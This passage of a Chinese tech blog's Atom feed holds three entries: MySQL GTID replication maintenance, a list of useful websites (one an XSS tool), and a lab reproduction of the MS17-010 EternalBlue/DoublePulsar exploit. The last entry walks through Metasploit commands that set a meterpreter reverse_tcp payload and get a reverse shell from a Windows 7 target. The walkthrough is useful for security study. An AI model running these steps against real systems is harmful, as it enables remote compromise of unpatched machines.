</div><div class="line">     Last_SQL_Error_Timestamp: </div><div class="line">               Master_SSL_Crl: </div><div class="line">           Master_SSL_Crlpath: </div><div class="line">           Retrieved_Gtid_Set: </div><div class="line">            Executed_Gtid_Set: </div><div class="line">                Auto_Position: 1</div><div class="line">         Replicate_Rewrite_DB: </div><div class="line">                 Channel_Name: </div><div class="line">           Master_TLS_Version: </div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">ERROR: </div><div class="line">No query specified</div><div class="line">	</div><div class="line">5. 让master 恢复读写</div><div class="line">    mysql &gt; SET @@global.read_only = OFF;</div></pre></td></tr></table></figure>
</li>
<li><p>从备份中恢复&amp;搭建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">1. 备份</div><div class="line">   mysqldump xx 获取并且记录gtid_purged值</div><div class="line">   --使用mysqldump导出数据库</div><div class="line">   # mysqldump --all-databases --single-transaction --triggers --routines --events \</div><div class="line">     --host=localhost --port=3306 --user=user --password=password &gt;/tmp/alldb.sql        </div><div class="line">   --导出的文件中已经包含了GTID_PURGED的信息</div><div class="line">   # grep GTID_PURGED /tmp/alldb.sql   </div><div class="line">   SET @@GLOBAL.GTID_PURGED=&apos;78336cdc-8cfb-11e6-ba9f-000c29328504:1-38&apos;;   </div><div class="line">   or</div><div class="line">   冷备份 --获取并且记录gtid_executed值，这个就相当于mysqldump中得到的gtid_purged</div><div class="line">2. 在新服务器上reset master,导入备份</div><div class="line">   reset master; --清空gtid信息  </div><div class="line">   导入备份； --如果是逻辑导入，请设置sql_log_bin=off</div><div class="line">   set global gtid_purged=xx;</div><div class="line">   </div><div class="line">   mysql&gt;SET @@GLOBAL.GTID_PURGED=&apos;78336cdc-8cfb-11e6-ba9f-000c29328504:1-38&apos;;  </div><div class="line">3. change master</div><div class="line">	mysql&gt; change master to</div><div class="line">           master_host=host,</div><div class="line">           master_port=port,</div><div class="line">           master_user=username,</div><div class="line">           master_password=password,</div><div class="line">           master_auto_position=1;</div><div class="line">    mysql&gt; start slave;</div><div class="line">	</div><div class="line">   root@localhost [(none)] &gt; CHANGE MASTER TO  MASTER_HOST=&apos;192.168.1.105&apos;,MASTER_PORT=3306,MASTER_USER=&apos;repl&apos;,MASTER_PASSWORD=&apos;repl_123456&apos;,MASTER_AUTO_POSITION=1;</div><div class="line">	Query OK, 0 rows affected, 2 warnings (0.16 sec)</div><div class="line">   root@localhost [(none)] &gt; start slave;</div><div class="line">	Query OK, 0 rows affected (0.01 sec)</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="GTID-运维和错误处理"><a href="#GTID-运维和错误处理" class="headerlink" title="GTID 运维和错误处理"></a><b>GTID 运维和错误处理</b></h5><ul>
<li>错误场景: Errant transaction<br>原因: </li>
</ul>
<ol>
<li>复制参数没有配置正确，当slave crash后，会出现重复键问题</li>
<li><p>DBA操作不正确，不小心在slave上执行了事务<br>传统模式下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">* skip transation; </div><div class="line">mysql&gt; SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1;</div><div class="line">mysql&gt; START SLAVE;</div></pre></td></tr></table></figure>
<p> GTID模式下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SET GTID_NEXT=&apos;b9b4712a-df64-11e3-b391-60672090eb04:7&apos;;   --设置需要跳过的gtid event</div><div class="line">mysql&gt; BEGIN;COMMIT;</div><div class="line">mysql&gt; SET GTID_NEXT=&apos;AUTOMATIC&apos;;</div><div class="line">mysql&gt; START SLAVE;</div><div class="line"></div><div class="line">其中gtid_next就是跳过某个执行事务，设置gtid_next的方法一次只能跳过一个事务，要批量的跳过事务可以通过设置gtid_purged完成</div><div class="line">mysql&gt; reset master;</div><div class="line">mysql&gt; set global gtid_purged=&apos;b9b4712a-df64-11e3-b391-60672090eb04:1-7,b9b4712a-df64-11e3-b391-60672090eb05:6&apos;;</div><div class="line">mysql&gt; show master status;</div><div class="line"></div><div class="line">此时从库的Executed_Gtid_Set已经包含了主库上&apos;1-7&apos;和&apos;6&apos;的事务，再开启复制会从后面的事务开始执行，就不会出错了。注意，使用gtid_next和gtid_purged修复复制错误的前提是，跳过那些事务后仍可以确保主备数据一致。如果做不到，就要考虑pt-table-sync或者拉备份的方式了</div></pre></td></tr></table></figure>
<p> 无论是否启用GTID，使用pt-slave-restart工具:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#忽略所有1062错误，并再次启动SLAVE进程</div><div class="line">pt-slave-resetart -S./mysql.sock —error-numbers=1062</div></pre></td></tr></table></figure>
<p> 备注: 当发生inject empty transction后，有可能会丢失事务<br>当slave上inject empty transction，说明有一个master的事务被忽略了（这里假设是 $uuid:100）<br>事务丢失一：如果此时此刻master挂了，这个slave被选举为新master，那么其他的slave如果还没有执行到$uuid:100,就会丢失掉$uuid:100这个事务<br>事务丢失二：如果从备份中重新搭建一个slave，需要重新执行之前的所有事务，而此时，master挂了， 又回到了事务丢失一的场景</p>
<p> mysqldump时GTID参数<br>[root@localhost ~]# /usr/local/whistle/mysql/bin/mysqldump –help|grep gtid-purged -A8<br>–set-gtid-purged[=name] </p>
<pre><code>Add &apos;SET @@GLOBAL.GTID_PURGED&apos; to the output. Possible
values for this option are ON, OFF and AUTO. If ON is
used and GTIDs are not enabled on the server, an error is
generated. If OFF is used, this option does nothing. If
AUTO is used and GTIDs are enabled on the server, &apos;SET
@@GLOBAL.GTID_PURGED&apos; is added to the output. If GTIDs
are disabled, AUTO does nothing. If no value is supplied
then the default (AUTO) value will be considered.
</code></pre></li>
</ol>
<p>ref</p>
<p><a href="http://keithlan.github.io/2016/06/23/gtid/" target="_blank" rel="external">MySQL5.7杀手级新特性：GTID原理与实战</a><br><a href="http://www.ywnds.com/?p=3898" target="_blank" rel="external">MySQL基于GTID的复制实现详解</a><br><a href="http://www.cnblogs.com/zhoujinyi/p/5704567.html" target="_blank" rel="external">MySQL 5.7 Replication 相关新功能说明</a><br><a href="http://blog.csdn.net/cug_jiang126com/article/details/54095181" target="_blank" rel="external">5.6mysqldump gtid的一个小坑</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;测试介绍: 一主一从&lt;br&gt;运行环境:&lt;br&gt;centos7.3、mysql5.7.17&lt;/p&gt;
&lt;h5 id=&quot;理论准备&quot;&gt;&lt;a href=&quot;#理论准备&quot; class=&quot;headerlink&quot; title=&quot;理论准备&quot;&gt;&lt;/a&gt;&lt;b&gt;理论准备&lt;/b&gt;&lt;/h5&gt;&lt;ul&gt;
&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>有趣的网址-不断更新中</title>
    <link href="https://t1ger.github.io/2017/05/19/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E5%9D%80-%E4%B8%8D%E6%96%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
    <id>https://t1ger.github.io/2017/05/19/有趣的网址-不断更新中/</id>
    <published>2017-05-19T03:23:05.000Z</published>
    <updated>2017-05-23T02:03:37.235Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>全球多节点域名解析查询<br><a href="https://www.whatsmydns.net" target="_blank" rel="external">https://www.whatsmydns.net</a></p>
</li>
<li><p>玩游戏,赚比特币<br><a href="http://bitcoin2048.com/?r=321516" target="_blank" rel="external">http://bitcoin2048.com</a></p>
</li>
<li><p>网站响应速度检测<br><a href="http://ping.chinaz.com" target="_blank" rel="external">http://ping.chinaz.com</a></p>
</li>
<li><p>简单快速地从全球多点PING您的网站或服务器<br><a href="http://www.super-ping.com" target="_blank" rel="external">http://www.super-ping.com</a></p>
</li>
<li><p>一个给网站打分的网站<br><a href="https://gtmetrix.com" target="_blank" rel="external">https://gtmetrix.com/</a></p>
</li>
<li><p>A tool for easy online testing and sharing of database problems and their solutions<br><a href="http://sqlfiddle.com/" target="_blank" rel="external">http://sqlfiddle.com/</a></p>
</li>
<li><p>微软IE虚拟机下载<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="external">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
</li>
<li><p>原型设计及协作工具<br><a href="https://modao.cc" target="_blank" rel="external">https://modao.cc</a></p>
</li>
<li><p>人人可用的在线问卷调查<br><a href="https://jinshuju.net/" target="_blank" rel="external">https://jinshuju.net/</a></p>
</li>
<li><p>pdf转word<br><a href="http://pdf2doc.com/zh/" target="_blank" rel="external">http://pdf2doc.com/zh/</a></p>
</li>
<li><p>Easy Firewall Generator for IPTables<br><a href="http://slogra.com/" target="_blank" rel="external">http://slogra.com/</a></p>
</li>
<li><p>SSL For Free<br><a href="https://www.sslforfree.com" target="_blank" rel="external">https://www.sslforfree.com/</a></p>
</li>
<li><p>电脑操作系统界面大全-GUI Gallery<br><a href="http://toastytech.com/guis/" target="_blank" rel="external">http://toastytech.com/guis/</a></p>
</li>
<li><p>在线模拟各种系统升级-Fakeupdate<br><a href="http://fakeupdate.net/" target="_blank" rel="external">http://fakeupdate.net/</a><br>进入网站后，点击右边的模板即可开始，按F11全屏显示，按回车键出现错误出画</p>
</li>
<li><p>一个免费的10G俄罗斯网盘<br><a href="https://yandex.com/" target="_blank" rel="external">https://yandex.com/</a></p>
</li>
<li><p>快速搭建远程同步画面-frop.io<br><a href="https://frop.io/" target="_blank" rel="external">https://frop.io/</a><br>进入网站后，由一方生成链接，发给另一方访问，这时，就可以将要展示的文件拖动到网页中发送了</p>
</li>
<li><p>线免费的前端黑工具<br><a href="http://xssor.io" target="_blank" rel="external">http://xssor.io</a></p>
</li>
</ul>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;全球多节点域名解析查询&lt;br&gt;&lt;a href=&quot;https://www.whatsmydns.net&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.whatsmydns.net&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>方程式-ms17-010复现</title>
    <link href="https://t1ger.github.io/2017/05/16/%E6%96%B9%E7%A8%8B%E5%BC%8F-ms17-010%E5%A4%8D%E7%8E%B0/"/>
    <id>https://t1ger.github.io/2017/05/16/方程式-ms17-010复现/</id>
    <published>2017-05-16T14:28:33.000Z</published>
    <updated>2017-05-16T14:01:15.340Z</updated>
    
    <content type="html"><![CDATA[<p>0x01 环境介绍:</p>
<p>目标机win7 x86: 192.168.1.120</p>
<p>控制机Kail: 192.168.1.99</p>
<p>0x02 环境准备</p>
<p>利用模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>wine可以在linux下运行windows程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install wine </div><div class="line">wine cmd.exe  打开cmd.exe,exit退出</div></pre></td></tr></table></figure></p>
<p>将链接的文件克隆到kali中，并将eternalblue_doublepulsar.rb移动至metasploit的exploit/windows/smb文件夹中,具体路径为/usr/share/metasploit-framework/modules/exploits/windows/smb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</div><div class="line">cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
<p>0x03 利用过程</p>
<p>设置参数，按照实际情况设置，DOUBLEPULSARPATH和ETERNALBLUEPATH指向从github下载的deps文件夹即可，里面包含了DOUBLEPULSAR和ETERNALBLUE所需的dll<br>设置一个payload<br>注意：如果靶机为64位，改为set payload windows/x64/meterpreter/reverse_tcp</p>
<p>然后打开msfconsole<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">use exploit/windows/smb/eternalblue_doublepulsar</div><div class="line">#set   DOUBLEPULSARPATH  /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">#set  ETERNALBLUEPATH   /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">set processinject lsass.exe</div><div class="line">#set TARGETARCHITECTURE  x64</div><div class="line">set rhost 192.168.1.120</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.99</div><div class="line">show targess </div><div class="line">set target 9</div><div class="line">options </div><div class="line">run</div></pre></td></tr></table></figure></p>
<p>最后在msf下可以看到成功反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;sysinfo</div><div class="line">meterpreter&gt;shell</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="http://www.cnblogs.com/backlion/p/6804863.html" target="_blank" rel="external">smb(ms17-010)远程命令执行之msf</a><br><a href="http://www.jianshu.com/p/ceb184b3dbc3" target="_blank" rel="external">ms17-010</a><br><a href="http://mt.sohu.com/20170505/n491866402.shtml" target="_blank" rel="external">方程式利用-不需Fuzzbunch完美入侵windows</a><br><a href="https://www.t00ls.net/articles-39343.html" target="_blank" rel="external">方程式ETERNALBLUE 之fb.py的复现</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 环境介绍:&lt;/p&gt;
&lt;p&gt;目标机win7 x86: 192.168.1.120&lt;/p&gt;
&lt;p&gt;控制机Kail: 192.168.1.99&lt;/p&gt;
&lt;p&gt;0x02 环境准备&lt;/p&gt;
&lt;p&gt;利用模块：&lt;a href=&quot;https://github.com/Eleven
    
    </summary>
    
    
  </entry>
  
</feed>
